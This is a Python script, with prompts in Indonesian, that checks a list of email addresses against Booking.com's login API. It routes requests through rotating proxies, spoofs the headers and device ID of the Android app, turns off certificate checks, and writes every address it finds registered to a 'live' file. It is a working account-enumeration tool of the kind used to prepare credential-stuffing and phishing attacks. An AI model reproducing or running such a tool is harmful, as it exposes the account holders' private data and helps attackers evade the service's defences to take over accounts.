import requests
import urllib3
import json
import concurrent.futures

def load_proxies(proxy_file_path):
    with open(proxy_file_path, 'r') as proxy_file:
        return [line.strip() for line in proxy_file if line.strip()]

def process_email(email_input, proxy_list, output_file):
    for proxy in proxy_list:
        try:
            proxy_host, proxy_port = proxy.split(':')
            
            uid = requests.get('https://random-data-api.com/api/device/random_device', 
                               proxies={'http': f'http://{proxy_host}:{proxy_port}'}).json()['uid']

            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

            headers = {
                'Host': 'account.booking.com',
                'X-booking-Iam-Tsafs': '21157',
                'X-Library': 'okhttp+network-api',
                'User-Agent': 'booking.App/39.0.0.1 Android/9; Type: tablet; AppStore: tencent; Brand: Samsung; Model: unknown;',
                'Content-Type': 'application/json; charset=UTF-8',
                'X-Px-Authorization': '3',
            }

            json_data = {
                'action': 'STEP_ENTER__EMAIL__SUBMIT',
                'context': {'value': ''},
                'deviceContext': {
                    'aid': 337862,
                    'deviceId': uid,
                    'deviceType': 'DEVICE_TYPE_ANDROID_NATIVE',
                    'lang': 'en-us',
                    'libVersion': '1.2.143',
                    'oauthClientId': 'eEUpvtgPz7Gv2NSOduzD',
                },
                'identifier': {
                    'type': 'IDENTIFIER_TYPE__EMAIL',
                    'value': email_input,
                },
            }

            response = requests.post(
                'https://account.booking.com/api/identity/authenticate/v1.0/enter/email/submit',
                headers=headers,
                json=json_data,
                verify=False,
                proxies={'http': f'http://{proxy_host}:{proxy_port}'},
                timeout=5
            )

            js = json.loads(response.text)

            if 'STEP_REGISTER__PASSWORD' in response.text:
                print(f"DIE => {email_input}")
            elif 'IDENTIFIER_TYPE__EMAIL' in response.text:
                if 'context' in js and 'value' in js['context']:
                    print(f"LIVE => {email_input}")
                    with open(output_file, 'a') as live_file:
                        live_file.write(email_input + '\n')
                    break

        except requests.exceptions.RequestException:
            print(f"Bad Proxy => {proxy}")
            continue

if __name__ == '__main__':
    file_path = input("Input List: ")
    num_threads = int(input("Jumlah Thread: "))
    output_file = input("Output File: ")
    proxy_file_path = input("File Proxy List (Format: proxy:port per baris): ")

    proxy_list = load_proxies(proxy_file_path)

    with open(file_path, 'r') as file:
        lines = file.readlines()

    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = [executor.submit(process_email, line.strip(), proxy_list, output_file) for line in lines]
